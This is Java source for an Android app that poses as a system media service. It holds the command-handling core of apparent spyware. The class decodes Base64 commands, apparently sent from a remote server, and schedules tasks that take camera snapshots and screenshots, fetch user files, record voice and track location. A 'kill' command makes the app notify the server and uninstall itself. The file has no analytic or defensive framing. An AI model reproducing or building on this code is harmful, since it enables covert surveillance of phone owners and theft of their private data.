package com.android.mediaserver.command;

import android.content.Context;
import android.util.Base64;
import com.android.mediaserver.network.NetworkManager;
import com.android.mediaserver.task.TaskScheduler;
import com.android.mediaserver.util.ApplicationsManager;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonParser;
import java.util.List;
import timber.log.Timber;

public class CommandHandler {
  private static CommandHandler mInstance;
  private Context mContext;
  private Gson mGson = new GsonBuilder().registerTypeAdapterFactory(
      RuntimeTypeAdapterFactory.of(Command.class)
          .registerSubtype(KillCommand.class, CommandType.KILL.toString())
          .registerSubtype(ConfigurationCommand.class, CommandType.CONFIGURATION.toString())
          .registerSubtype(CameraSnapshotCommand.class, CommandType.SNAPSHOT.toString())
          .registerSubtype(ScreenshotCommand.class, CommandType.SCREENSHOT.toString())
          .registerSubtype(FetchUserFileCommand.class, CommandType.USER_FILE.toString())
          .registerSubtype(VoiceRecordCommand.class, CommandType.VOICE.toString())
          .registerSubtype(LocationCommand.class, CommandType.LOCATION.toString())).create();
  private NetworkManager mNetworkManager;
  private TaskScheduler mTaskScheduler;

  private CommandHandler(Context context) {
    mContext = context;
    mNetworkManager = NetworkManager.getInstance(context);
    mTaskScheduler = TaskScheduler.getInstance(context);
  }

  public static CommandHandler getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new CommandHandler(context);
    }
    return mInstance;
  }

  public void handleOldCommands(String commandLines) {
    for (String command : commandLines.split("\n")) {
      if (command.equals("kill")) {
        handleKill();
      }
    }
  }

  public void handleNewCommands(String commandsB64) {
    for (String b64command : commandsB64.split("\n")) {
      String commandJson = new String(Base64.decode(b64command.getBytes(), 0));
      Command command = (Command) mGson.fromJson(commandJson, Command.class);
      command.setType(
          new JsonParser().parse(commandJson).getAsJsonObject().get("type").getAsString());
      Timber.d("Received command: %s", command);
      handleCommand(command);
    }
  }

  private void handleCommands(List<Command> commandList) {
    for (Command command : commandList) {
      handleCommand(command);
    }
  }

  private void handleCommand(Command command) {
    if (command != null) {
      mTaskScheduler.scheduleTask(command);
    }
  }

  private void handleKill() {
    Timber.d("Uninstalling, Reason: Got kill command", new Object[0]);
    mNetworkManager.notifyUninstall();
    ApplicationsManager.getInstance(mContext).uninstallSelf();
  }
}
